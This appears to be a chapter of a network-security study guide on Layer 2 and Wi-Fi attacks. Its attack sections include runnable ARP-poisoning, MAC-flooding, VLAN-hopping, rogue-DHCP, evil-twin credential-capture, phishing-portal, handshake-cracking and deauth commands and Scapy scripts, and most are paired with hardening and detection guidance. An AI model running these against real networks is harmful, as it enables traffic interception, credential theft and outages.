# Domain 9, Chapter 9B — Layer 2, Wireless, Telecom, and SDN Security

> **Scope.** ARP spoofing, VLAN hopping, STP manipulation, MAC flooding, DHCP attacks, CDP/LLDP reconnaissance, MACsec, 802.1X/EAP. Wi-Fi (WPA2 KRACK, WPA3 Dragonblood, PMKID, evil twin, deauth, 802.11w, WPS, WiFi Direct). Bluetooth (BIAS, BLURtooth, KNOB, BLE relay). NFC (MIFARE Classic, EMV relay). RFID cloning. SS7 (location tracking, SMS interception, call redirect), Diameter, 5G (SUCI, 5G-AKA, SEPP), IMSI catchers, SIM swapping, VoLTE/VoWiFi. SDN (OpenFlow, controller attacks, flow table poisoning, VXLAN/Geneve, OVS, eBPF/XDP, netfilter bypass, micro-segmentation).

---

## 1. Layer 2 Attacks and Defenses

### 1.1 ARP Spoofing / Poisoning

#### Mechanism

ARP (RFC 826) has zero authentication. Any host on a broadcast domain can emit a gratuitous ARP reply — an unsolicited ARP response that updates the receiver's ARP cache without a prior request. The protocol trusts every reply unconditionally.

**Gratuitous ARP frame structure:**

| Field | Value |
|-------|-------|
| Opcode | 2 (Reply) |
| Sender MAC | Attacker's MAC |
| Sender IP | Target IP being spoofed (e.g., gateway 192.168.1.1) |
| Target MAC | ff:ff:ff:ff:ff:ff (broadcast) or victim's MAC |
| Target IP | Same as Sender IP (gratuitous) |

The attacker sends two streams of gratuitous ARPs:
1. To the **victim**: "192.168.1.1 (gateway) is at AA:BB:CC:DD:EE:FF (attacker MAC)"
2. To the **gateway**: "192.168.1.100 (victim) is at AA:BB:CC:DD:EE:FF (attacker MAC)"

Both update their ARP caches. All traffic between victim and gateway transits the attacker — a full-duplex Layer 2 MitM. The attacker must enable IP forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`) or the connection dies.

#### Enumeration

```bash
# Discover hosts on the local subnet
nmap -sn 192.168.1.0/24

# View current ARP cache
arp -a
ip neigh show

# Identify gateway
ip route show default
```

#### Exploitation

**arpspoof (dsniff suite):**

```bash
# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison victim's cache (tell victim we are the gateway)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Poison gateway's cache (tell gateway we are the victim)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

**ettercap:**

```bash
# Unified MitM sniffing with ARP poisoning
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Text mode, quiet, target the gateway and victim
# -M arp:remote poisons both directions and forwards traffic
```

**Bettercap:**

```bash
# Start bettercap on interface
bettercap -iface eth0

# Inside bettercap console:
net.probe on                          # discover hosts
set arp.spoof.targets 192.168.1.100   # victim IP
set arp.spoof.fullduplex true         # poison both victim and gateway
arp.spoof on                          # start poisoning
net.sniff on                          # capture traffic
set net.sniff.local true              # include local traffic

# Capture HTTP credentials
set net.sniff.regexp .*password.*
```

**Scapy (custom ARP poisoning):**

```python
from scapy.all import *

def poison(victim_ip, victim_mac, gateway_ip):
    pkt = Ether(dst=victim_mac) / ARP(
        op=2,                    # ARP Reply
        pdst=victim_ip,          # Victim IP
        hwdst=victim_mac,        # Victim MAC
        psrc=gateway_ip           # Claim to be gateway
    )
    sendp(pkt, iface="eth0", loop=1, inter=2)
```

#### Detection

**arpwatch:**

```bash
# Install and start monitoring
apt install arpwatch
arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat

# arpwatch logs flip-flop events to syslog when MAC-IP bindings change
# Look for "flip flop" and "changed ethernet address" in /var/log/syslog
```

**Snort/Suricata IDS rules:**

```text
# Detect gratuitous ARP (sender IP == target IP in ARP reply)
alert arp any any -> any any (msg:"Gratuitous ARP detected"; \
  arp.opcode:2; arp.src_ip == arp.dst_ip; sid:1000001; rev:1;)

# Detect ARP cache poisoning (duplicate IP with different MACs)
alert arp any any -> any any (msg:"ARP spoofing - IP conflict"; \
  arp.opcode:2; sid:1000002; rev:1;)
```

**nmap ARP scan for verification:**

```bash
# Compare results — if multiple MACs claim same IP, poisoning is active
nmap -PR -sn 192.168.1.0/24
```

#### Hardening — Dynamic ARP Inspection (DAI)

**Cisco IOS:**

```text
! Enable DHCP snooping first (DAI depends on it)
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! Enable DAI on target VLANs
ip arp inspection vlan 10,20,30

! Trust uplinks to DHCP server and other switches
interface GigabitEthernet0/1
 ip arp inspection trust
 ip dhcp snooping trust

! Rate-limit ARP on access ports (prevent DoS via ARP flood)
interface range GigabitEthernet0/2 - 48
 ip arp inspection limit rate 15

! Optional: validate source MAC, dest MAC, and IP in ARP
ip arp inspection validate src-mac dst-mac ip
```

**Juniper Junos:**

```text
set ethernet-switching-options secure-access-port dhcp-snooping vlan all
set ethernet-switching-options secure-access-port arp-inspection

# Trust uplink
set interfaces ge-0/0/0 unit 0 family ethernet-switching dhcp-trusted
```

**Static ARP entries (critical hosts):**

```bash
# Linux — set static ARP for gateway
arp -s 192.168.1.1 AA:BB:CC:DD:EE:01

# Windows
netsh interface ipv4 add neighbors "Ethernet" 192.168.1.1 AA-BB-CC-DD-EE-01
```

#### Incident Response

1. Identify the rogue MAC via `arp -a` on affected hosts — the gateway IP will show the attacker's MAC.
2. Cross-reference the MAC against the switch CAM table: `show mac address-table address AABB.CCDD.EEFF`.
3. Identify the physical port and disable it: `shutdown`.
4. Capture traffic on the victim's interface for forensic analysis: `tcpdump -i eth0 -w arp_incident.pcap arp`.
5. Flush ARP caches on all affected hosts: `ip neigh flush all`.
6. Deploy DAI if not already configured.

---

### 1.2 MAC Flooding

#### Mechanism

Switches maintain a CAM (Content Addressable Memory) table mapping MAC addresses to physical ports. Typical capacity: 8K-128K entries depending on hardware. When the table is full, the switch cannot learn new entries and fails open — flooding frames out all ports on the VLAN, turning the switch into a hub. The attacker can then passively sniff all traffic on the segment.

#### Exploitation

**macof (dsniff suite):**

```bash
# Flood the CAM table with random MACs
macof -i eth0

# macof sends ~150,000 random MAC frames/sec
# Typical CAM table fills in seconds
```

**yersinia:**

```bash
# Interactive mode
yersinia -I

# Or direct command for CAM flooding
yersinia eth0 -attack 1

# yersinia also supports STP, DTP, DHCP, CDP, and 802.1Q attacks
```

**Scapy (controlled flooding):**

```python
from scapy.all import *

def mac_flood(iface, count=100000):
    for _ in range(count):
        pkt = Ether(
            src=RandMAC(),
            dst=RandMAC()
        ) / IP(
            src=RandIP(),
            dst=RandIP()
        ) / ICMP()
        sendp(pkt, iface=iface, verbose=False)
```

#### Detection

```bash
# Monitor CAM table size on switch
show mac address-table count

# SNMP monitoring for table size
snmpwalk -v2c -c public switch_ip 1.3.6.1.2.1.17.7.1.2.1.1.2

# Syslog alert on rapid MAC learning
# Cisco: %SW_MATM-4-MACFLAP_NOTIF
```

#### Hardening — Port Security

**Cisco IOS:**

```text
interface GigabitEthernet0/5
 switchport mode access
 switchport port-security
 switchport port-security maximum 3
 switchport port-security violation shutdown
 switchport port-security aging time 60
 switchport port-security aging type inactivity
 switchport port-security mac-address sticky

! Verify
show port-security interface GigabitEthernet0/5
show port-security address
```

**Violation modes:**

| Mode | Action |
|------|--------|
| `shutdown` | Disables port (err-disabled), sends SNMP trap, syslog |
| `restrict` | Drops violating frames, increments counter, sends syslog |
| `protect` | Drops violating frames silently, no log |

**Juniper Junos:**

```text
set interfaces ge-0/0/5 unit 0 family ethernet-switching port-security mac-limit 3
set interfaces ge-0/0/5 unit 0 family ethernet-switching port-security mac-limit action shutdown
```

---

### 1.3 VLAN Attacks

#### 1.3.1 Switch Spoofing (DTP Abuse)

**Mechanism.** Dynamic Trunking Protocol (DTP) auto-negotiates trunk links between Cisco switches. If an access port is left in `dynamic auto` or `dynamic desirable` mode, an attacker can send DTP negotiation frames to form a trunk, gaining access to all VLANs carried on that trunk.

**Exploitation:**

```bash
# yersinia DTP attack — negotiate a trunk
yersinia dtp -attack 1 -interface eth0

# Verify trunk formation
# On attacker's Linux box, create VLAN sub-interfaces:
modprobe 8021q
vconfig add eth0 20
ifconfig eth0.20 10.20.0.100 netmask 255.255.255.0 up

# Or with ip commands:
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 10.20.0.100/24 dev eth0.20
ip link set eth0.20 up
```

**Frogger (VLAN hopping tool):**

```bash
# Frogger automates DTP negotiation and VLAN access
./frogger.sh -i eth0
```

**Hardening:**

```text
! Disable DTP on ALL access ports
interface range GigabitEthernet0/1 - 48
 switchport mode access
 switchport nonegotiate

! Explicitly configure trunk ports
interface GigabitEthernet0/49
 switchport mode trunk
 switchport nonegotiate
 switchport trunk allowed vlan 10,20,30
 switchport trunk native vlan 999
```

#### 1.3.2 Double Tagging

**Mechanism.** The attacker crafts a frame with two 802.1Q headers. The outer tag matches the native VLAN of the trunk port. The first switch strips the outer tag (because it matches the native VLAN) and forwards the frame based on the inner tag to the target VLAN. The attack is **unidirectional** — replies cannot return via the same path.

**Requirements:**
- Attacker's port must be on the same VLAN as the trunk's native VLAN.
- The native VLAN must be the same on both ends of the trunk.

**Exploitation (Scapy):**

```python
from scapy.all import *

# Double-tagged frame: outer VLAN 1 (native), inner VLAN 20 (target)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \
      Dot1Q(vlan=20) / \
      IP(dst="10.20.0.50") / \
      ICMP()

sendp(pkt, iface="eth0")
```

**Hardening:**

```text
! Set native VLAN to an unused VLAN on all trunks
interface GigabitEthernet0/49
 switchport trunk native vlan 999

! Tag native VLAN traffic (prevents stripping)
vlan dot1q tag native

! Never assign user ports to the native VLAN
! Prune unused VLANs from trunks
switchport trunk allowed vlan 10,20,30
```

#### 1.3.3 Private VLANs (PVLAN)

PVLANs provide port isolation within a VLAN. Three port types:

| Type | Can Talk To |
|------|------------|
| Promiscuous | All ports (gateway, router) |
| Isolated | Promiscuous only (no inter-host communication) |
| Community | Same-community + promiscuous ports |

**PVLAN proxy attack.** An isolated host sends a frame to the promiscuous port (router) with a spoofed destination IP of another isolated host. The router routes it back into the VLAN, bypassing isolation. Mitigated by PVLAN-aware ACLs on the promiscuous port that block intra-VLAN routing.

```text
! Cisco PVLAN configuration
vlan 100
 private-vlan primary
vlan 101
 private-vlan isolated
vlan 102
 private-vlan community

vlan 100
 private-vlan association 101,102

interface GigabitEthernet0/1
 switchport mode private-vlan promiscuous
 switchport private-vlan mapping 100 101,102

interface GigabitEthernet0/2
 switchport mode private-vlan host
 switchport private-vlan host-association 100 101
```

---

### 1.4 STP Attacks

#### Mechanism

Spanning Tree Protocol (STP / RSTP / MSTP) elects a root bridge based on Bridge ID (priority + MAC). All traffic paths are computed relative to the root. The bridge with the lowest priority wins. Default priority: 32768. An attacker who sends BPDUs with priority 0 becomes root, causing all switch-to-switch traffic to flow through the attacker.

#### Exploitation

**yersinia STP root bridge hijack:**

```bash
# Interactive mode
yersinia -I
# Select STP protocol, launch "claiming root bridge" attack

# CLI mode — send BPDUs with priority 0
yersinia stp -attack 4 -interface eth0

# Attack types in yersinia:
# 1: Send raw BPDU
# 2: Send raw TCN (Topology Change Notification)
# 3: DoS via TCN flood
# 4: Claim root bridge (priority 0)
# 5: Claim other bridge
# 6: Claim root bridge with MiTM
```

**Scapy BPDU injection:**

```python
from scapy.all import *

# Craft BPDU with priority 0 to claim root
bpdu = Ether(dst="01:80:c2:00:00:00", src=get_if_hwaddr("eth0")) / \
       LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
       STP(
           rootid=0,                    # priority 0
           rootmac="aa:bb:cc:dd:ee:ff", # attacker MAC
           bridgeid=0,
           bridgemac="aa:bb:cc:dd:ee:ff",
           portid=0x8001,
           pathcost=0
       )

sendp(bpdu, iface="eth0", loop=1, inter=2)
```

#### Hardening

**Cisco IOS:**

```text
! BPDU Guard — shuts down access ports that receive BPDUs
interface range GigabitEthernet0/1 - 48
 spanning-tree bpduguard enable

! Enable globally for all PortFast ports
spanning-tree portfast bpduguard default

! Root Guard — prevents a port from becoming root port
interface GigabitEthernet0/49
 spanning-tree guard root

! Loop Guard — prevents alternate/root ports from transitioning
! to forwarding if BPDUs stop arriving (unidirectional link)
interface GigabitEthernet0/49
 spanning-tree guard loop

! BPDU Filter (use carefully — disables STP on port)
interface GigabitEthernet0/5
 spanning-tree bpdufilter enable

! Set the legitimate switch to lowest priority (ensure it stays root)
spanning-tree vlan 1-4094 priority 0
```

**Guard comparison:**

| Guard | Purpose | Applies To |
|-------|---------|-----------|
| BPDU Guard | Shuts port on BPDU receipt | Access ports (PortFast) |
| Root Guard | Prevents port from becoming root port | Designated ports toward edge |
| Loop Guard | Prevents forwarding on BPDU loss | Root/alternate ports |

---

### 1.5 DHCP Attacks

#### 1.5.1 DHCP Starvation

**Mechanism.** The attacker floods the network with DHCP Discover messages, each with a different client MAC. The DHCP server allocates its entire IP pool to fake clients, leaving no addresses for legitimate hosts.

**DHCPig:**

```bash
# Exhaust DHCP pool
pig.py eth0

# DHCPig sends rapid DHCPDISCOVER with random MACs
# Also releases existing leases and sends DECLINEs
```

**Scapy DHCP starvation:**

```python
from scapy.all import *

for i in range(254):
    mac = RandMAC()
    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
          IP(src="0.0.0.0", dst="255.255.255.255") / \
          UDP(sport=68, dport=67) / \
          BOOTP(chaddr=[mac2str(str(mac))]) / \
          DHCP(options=[("message-type", "discover"), "end"])
    sendp(pkt, iface="eth0", verbose=False)
```

**yersinia DHCP attack:**

```bash
# DHCP starvation
yersinia dhcp -attack 1 -interface eth0
```

#### 1.5.2 Rogue DHCP Server

**Mechanism.** The attacker runs a DHCP server that responds faster than the legitimate server. Victims receive an IP configuration with the attacker's machine as the default gateway and/or DNS server, enabling MitM or DNS poisoning.

```bash
# Using dnsmasq as rogue DHCP
dnsmasq --interface=eth0 \
        --dhcp-range=192.168.1.100,192.168.1.200,12h \
        --dhcp-option=3,192.168.1.50 \        # gateway = attacker
        --dhcp-option=6,192.168.1.50 \        # DNS = attacker
        --no-daemon --log-queries

# Or with Bettercap
bettercap -iface eth0
set dhcp6.spoof.domains example.com
dhcp6.spoof on
```

#### Hardening — DHCP Snooping

**Cisco IOS:**

```text
! Enable DHCP snooping globally
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! Trust uplink to legitimate DHCP server
interface GigabitEthernet0/1
 ip dhcp snooping trust

! Rate-limit DHCP on access ports
interface range GigabitEthernet0/2 - 48
 ip dhcp snooping limit rate 10

! Verify binding table
show ip dhcp snooping binding

! Option 82 insertion (for relay agents)
ip dhcp snooping information option
```

**Juniper Junos:**

```text
set ethernet-switching-options secure-access-port dhcp-snooping vlan all
set interfaces ge-0/0/0 unit 0 family ethernet-switching dhcp-trusted
```

---

### 1.6 CDP/LLDP Reconnaissance

#### Mechanism

Cisco Discovery Protocol (CDP) and Link Layer Discovery Protocol (LLDP) broadcast device information in plaintext: hostname, IP address, platform/model, IOS version, VLAN info, duplex settings. An attacker on the LAN can passively capture these frames and map the entire network infrastructure.

#### Exploitation

**cdpsnarf:**

```bash
# Passive CDP listener
cdpsnarf -i eth0

# Output: hostnames, IPs, platforms, IOS versions, VLANs, port IDs
```

**Wireshark/tcpdump:**

```bash
# Capture CDP frames
tcpdump -i eth0 -nn -v 'ether[20:2] == 0x2000'

# Capture LLDP frames
tcpdump -i eth0 -nn -v 'ether proto 0x88cc'
```

**yersinia CDP attack:**

```bash
# CDP flooding — fill switch CDP table, potentially crash it
yersinia cdp -attack 1 -interface eth0
```

#### Hardening

```text
! Disable CDP globally (if not needed)
no cdp run

! Disable CDP on specific interfaces (access ports toward users)
interface range GigabitEthernet0/1 - 48
 no cdp enable

! Disable LLDP globally
no lldp run

! Disable LLDP per-interface
interface range GigabitEthernet0/1 - 48
 no lldp transmit
 no lldp receive
```

Keep CDP/LLDP enabled only on inter-switch trunks and management interfaces where the information is operationally needed.

---

### 1.7 MACsec (802.1AE)

MACsec provides hop-by-hop Layer 2 encryption and integrity using AES-128-GCM or AES-256-GCM. Each frame is encapsulated with a SecTAG (Security Tag) header and an ICV (Integrity Check Value) trailer.

**Key management:** 802.1X-2010 with MKA (MACsec Key Agreement) derives session keys from the EAP-TLS authentication. Connectivity Associations (CAs) define the group of ports sharing keys.

**Frame structure:**

```
[Ether Header] [SecTAG] [Encrypted Payload] [ICV (16 bytes)]
```

**Coverage:** MACsec encrypts everything after the Ethernet header — including VLAN tags, IP headers, and payload. It does not encrypt the Ethernet header itself (needed for switching).

**Deployment models:**
- **Host-to-switch:** Protects the access link (requires NIC support — Intel X710/X550, Mellanox ConnectX)
- **Switch-to-switch:** Protects inter-switch links (requires hardware ASIC support)
- **Data center east-west:** Protects server-to-server traffic within fabric

**Cisco IOS-XE configuration:**

```text
! Define MACsec policy
mka policy MACSEC-POLICY
 key-server priority 0
 macsec-cipher-suite gcm-aes-256
 confidentiality-offset 0

! Apply to interface
interface TenGigabitEthernet1/0/1
 mka policy MACSEC-POLICY
 mka pre-shared-key key-chain MACSEC-KEYS
 macsec
```

---

### 1.8 802.1X / NAC

#### EAP Method Comparison

| Method | Auth Type | Client Cert | Server Cert | Inner Auth | Security |
|--------|----------|-------------|-------------|------------|----------|
| EAP-TLS | Mutual TLS | Required | Required | N/A | Highest — mutual PKI |
| EAP-PEAP | TLS tunnel | No | Required | MSCHAPv2 / EAP-GTC | High — server cert validated |
| EAP-TTLS | TLS tunnel | No | Required | PAP/CHAP/MSCHAPv2 | High — flexible inner |
| EAP-FAST | TLS tunnel (PAC) | No | Optional | MSCHAPv2 / EAP-GTC | Medium — PAC provisioning risks |

#### RADIUS Integration

```text
! Cisco IOS — 802.1X configuration
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius

radius server PRIMARY
 address ipv4 10.1.1.100 auth-port 1812 acct-port 1813
 key 0 SuperSecretRadius!

dot1x system-auth-control

interface GigabitEthernet0/5
 switchport mode access
 switchport access vlan 10
 authentication port-control auto
 authentication order dot1x mab
 authentication priority dot1x mab
 dot1x pae authenticator
 mab
```

#### MAB (MAC Authentication Bypass) Fallback

MAB authenticates devices that cannot run a supplicant (printers, IP phones, IoT) by their MAC address. The switch sends the device's MAC as the username/password to RADIUS. **Security weakness:** MACs are trivially spoofable. MAB should assign devices to a restricted VLAN with limited access.

#### Bypass Techniques

**EAP downgrade attack (hostapd-mana + freeradius-wpe):**

```bash
# hostapd-mana — evil twin that captures EAP credentials
# /etc/hostapd-mana/hostapd-mana.conf:
interface=wlan0
ssid=CorpWiFi
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana/hostapd-mana.eap_user
mana_wpe=1
mana_credout=/tmp/creds.txt

# Start the fake AP + RADIUS
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# Captured MSCHAPv2 challenge/response written to /tmp/creds.txt
# Crack with asleap or hashcat:
asleap -C <challenge> -R <response> -W /path/to/wordlist.txt
hashcat -m 5500 captured_hash.txt /path/to/wordlist.txt
```

**802.1X bypass via hub injection:** Insert a hub between an authenticated device and the switch port. Once the device authenticates, the port is open — the attacker's device behind the hub also has access. Mitigation: enable `authentication host-mode single-host` and periodic re-authentication.

**VLAN hop post-authentication:** If the switch places authenticated users in a specific VLAN, the attacker (after MAB fallback to a guest VLAN) may attempt double-tagging to reach the authenticated VLAN. Combine 802.1X with VLAN hardening from section 1.3.

---

## 2. Wireless Security (802.11)

### 2.1 WiFi Reconnaissance

#### Interface Setup

```bash
# Identify wireless interfaces
iwconfig
iw dev

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify monitor mode
iwconfig wlan0mon
```

#### Scanning

**airodump-ng:**

```bash
# Scan all channels, all bands
airodump-ng wlan0mon

# Target specific channel and BSSID
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Output fields:
# BSSID, PWR (signal), #Data, #/s, CH, MB, ENC, CIPHER, AUTH, ESSID
# STATION (associated clients), Probes (SSIDs clients are looking for)
```

**Kismet:**

```bash
# Start Kismet (modern web UI)
kismet -c wlan0mon

# Access web interface at http://localhost:2501
# Kismet logs to .kismet database (SQLite)
# Export: kismetdb_to_pcap, kismetdb_to_wiglecsv
```

**WiFi Pineapple (recon module):**

```bash
# Via pineapple CLI
recon start --interface wlan1mon --duration 60 --output /tmp/scan.json

# PineAP module probes for SSIDs, captures handshakes
# Dashboard: http://172.16.42.1:1471
```

---

### 2.2 WPA2 Attacks

#### 2.2.1 Four-Way Handshake Capture + Cracking

**Mechanism.** The 4-way handshake derives the PTK (Pairwise Transient Key) from: PMK (from password + SSID via PBKDF2), ANonce (AP), SNonce (client), AP MAC, client MAC. Capturing the handshake allows offline brute-force of the PSK.

```bash
# Step 1: Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Step 2: Deauth a client to force re-association (capture fresh handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauth, 5 = send 5 deauth frames

# Step 3: Verify handshake captured
# airodump-ng shows "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right

# Step 4: Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Step 5: Crack with hashcat (GPU-accelerated)
# Convert capture to hashcat format
cap2hccapx handshake-01.cap handshake.hccapx

hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
# -m 2500 = WPA/WPA2

# Or use hashcat with the newer .22000 format:
hcxpcapngtool -o hash.22000 handshake-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

#### 2.2.2 PMKID Attack (Clientless)

**Mechanism.** The AP includes a PMKID in the first EAPOL message (message 1 of the 4-way handshake). `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)`. The attacker captures this single frame without waiting for a client to complete the handshake. No deauthentication needed.

```bash
# Step 1: Capture PMKID with hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2

# Step 2: Extract PMKID hash
hcxpcapngtool -o pmkid_hash.22000 pmkid.pcapng

# Step 3: Crack with hashcat
hashcat -m 22000 pmkid_hash.22000 /usr/share/wordlists/rockyou.txt

# Advantages over handshake capture:
# - No client needed (works on networks with no active clients)
# - No deauthentication (stealthier)
# - Single frame capture
```

#### 2.2.3 KRACK (Key Reinstallation Attack)

CVE-2017-13082 and related. The attacker, positioned as MitM (using channel-based MitM on the AP's MAC), replays message 3 of the 4-way handshake. The client reinstalls the already-in-use PTK, resetting the nonce counter to zero. With nonce reuse, AES-CCMP keystream repeats — XOR two ciphertexts to cancel the keystream and recover plaintext. Against TKIP (GCMP), the attack also enables frame injection.

**Affected handshakes:** 4-way, group key, FT (Fast BSS Transition / 802.11r), PeerKey, TDLS.

**Mitigation:** Patch clients (do not reinstall keys on retransmission). AP-side: avoid retransmitting message 3 if message 4 was received.

---

### 2.3 WPA3 and Dragonblood

#### SAE (Simultaneous Authentication of Equals)

WPA3-Personal replaces PSK with SAE — a zero-knowledge proof based on the Dragonfly key exchange (RFC 7664). Both parties prove knowledge of the password without revealing it. SAE provides:
- **Forward secrecy:** Unique session keys; compromising one session does not reveal others.
- **Offline dictionary resistance:** Passive capture of the SAE exchange does not enable offline brute-force.

#### Dragonblood Vulnerabilities

**CVE-2019-9494 — SAE cache-based side-channel.** The hash-to-group-element function's execution varies based on the password. Cache access patterns during the quadratic residue test leak whether a candidate password is correct.

**CVE-2019-9495 — EAP-pwd cache-based side-channel.** Same vulnerability in EAP-pwd (used in WPA3-Enterprise). Cache timing during the scalar multiplication reveals password-dependent information.

**CVE-2019-9496 — SAE confirm message processing.** An attacker can send forged SAE Confirm messages before the protocol completes, causing the AP to process invalid states.

**CVE-2019-9497 — EAP-pwd reflection attack.** The attacker reflects the peer's own EAP-pwd Commit message back, causing the peer to derive a session key from its own values, enabling bypass.

**Downgrade attack (transition mode):**

```bash
# WPA3 transition mode allows WPA2 fallback
# Attacker creates evil twin advertising only WPA2
# Client downgrades to WPA2, losing SAE protections

# Detect via airodump-ng: look for RSN capabilities
# WPA3: SAE, MFPC (Management Frame Protection Capable), MFPR (Required)
airodump-ng wlan0mon --wpa-type 3
```

**Mitigation:** Deploy WPA3-only (no transition mode). Ensure MFPR (Management Frame Protection Required) is set.

---

### 2.4 Evil Twin / Rogue AP

#### hostapd-mana Configuration

```bash
# /etc/hostapd-mana/hostapd-mana.conf
interface=wlan0
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g
ieee80211n=1

# KARMA — respond to all probe requests
enable_mana=1
mana_loud=1

# WPA2 (for credential capture)
# wpa=2
# wpa_key_mgmt=WPA-PSK
# wpa_pairwise=CCMP
# wpa_passphrase=password123

# Open network (for captive portal)
auth_algs=1
wpa=0

# EAP credential capture
# mana_wpe=1
# mana_credout=/tmp/creds.txt

# Launch
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

#### Captive Portal Phishing

```bash
# Set up NAT and DHCP for victims
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

dnsmasq --interface=wlan0 --dhcp-range=10.0.0.10,10.0.0.200,12h \
         --dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1 --no-daemon

# Serve phishing portal (e.g., with a Python HTTP server or dedicated tool)
# Bettercap caplet for HTTP proxy + credential sniffing:
bettercap -iface wlan0 -caplet http-ui
```

#### KARMA Attack

KARMA responds to all client probe requests regardless of SSID. If a client probes for "HomeWiFi", KARMA responds as "HomeWiFi". The client auto-connects because the SSID matches a known network.

**Bettercap WiFi attack automation:**

```bash
bettercap -iface wlan0mon

# In Bettercap console:
wifi.recon on
wifi.deauth AA:BB:CC:DD:EE:FF    # deauth from legitimate AP
wifi.ap                           # start soft AP
```

---

### 2.5 WPA2-Enterprise Attacks

#### Mechanism

WPA2-Enterprise uses 802.1X/EAP authentication through a RADIUS server. The most common deployment is EAP-PEAP with MSCHAPv2 inner authentication. The client validates the server's TLS certificate — but many supplicants are misconfigured to accept any certificate.

#### Attack: Fake RADIUS with hostapd-mana

```bash
# /etc/hostapd-mana/hostapd-mana.conf (Enterprise mode)
interface=wlan0
ssid=CorpNet
channel=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana/hostapd-mana.eap_user

# Certificate (self-signed or look-alike)
ca_cert=/etc/hostapd-mana/certs/ca.pem
server_cert=/etc/hostapd-mana/certs/server.pem
private_key=/etc/hostapd-mana/certs/server.key

# Credential capture
mana_wpe=1
mana_credout=/tmp/enterprise_creds.txt

# EAP user file (/etc/hostapd-mana/hostapd-mana.eap_user):
# Accept any identity with any EAP method
# * PEAP,TTLS,TLS,FAST
# "t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP "password" [2]
```

```bash
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf

# Captured output:
# username: jsmith
# challenge: ab:cd:ef:01:23:45:67:89
# response: de:ad:be:ef:ca:fe:ba:be:...

# Crack MSCHAPv2 with asleap
asleap -C ab:cd:ef:01:23:45:67:89 \
       -R de:ad:be:ef:ca:fe:ba:be:... \
       -W /usr/share/wordlists/rockyou.txt

# Or convert to hashcat format
# hashcat -m 5500 netntlm_hash.txt wordlist.txt
```

#### freeradius-wpe (Wireless Pwnage Edition)

```bash
# Patched FreeRADIUS that logs EAP credentials
# Install from Kali repos
apt install freeradius-wpe

# Configuration: /etc/freeradius-wpe/radiusd.conf
# Enable credential logging
# Logs to /var/log/freeradius-wpe/freeradius-server-wpe.log

# Use with hostapd pointing to local RADIUS
# In hostapd.conf:
# auth_server_addr=127.0.0.1
# auth_server_port=1812
# auth_server_shared_secret=testing123
```

**Mitigation:** Configure supplicants to validate the RADIUS server's certificate (pin CA, verify CN/SAN). Deploy EAP-TLS (mutual cert auth) instead of PEAP/MSCHAPv2.

---

### 2.6 Deauthentication Attacks

#### Mechanism

802.11 management frames (deauth, disassociation) are unauthenticated and unencrypted in WPA2. Any device can forge them. The deauth frame contains a reason code and the BSSID — the client accepts it and disconnects.

#### Exploitation

**aireplay-ng:**

```bash
# Targeted deauth (specific client)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauth
# 10 = number of deauth packets (0 = continuous)
# -a = AP BSSID
# -c = client MAC

# Broadcast deauth (all clients)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**mdk4 (successor to mdk3):**

```bash
# Deauth all clients on all detected APs
mdk4 wlan0mon d

# Targeted deauth with channel hopping
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6

# Beacon flood (create fake APs to confuse clients)
mdk4 wlan0mon b -f ssid_list.txt -c 6

# Authentication DoS (flood AP with auth requests)
mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF
```

#### Protection: 802.11w (Protected Management Frames / PMF)

802.11w encrypts and authenticates management frames using the IGTK (Integrity Group Temporal Key), preventing forgery. Deauth/disassoc frames include a MIC that clients validate.

| 802.11w Mode | Behavior |
|--------------|----------|
| Disabled | No protection (default WPA2) |
| Optional (MFPC) | Protects capable clients; legacy clients still work |
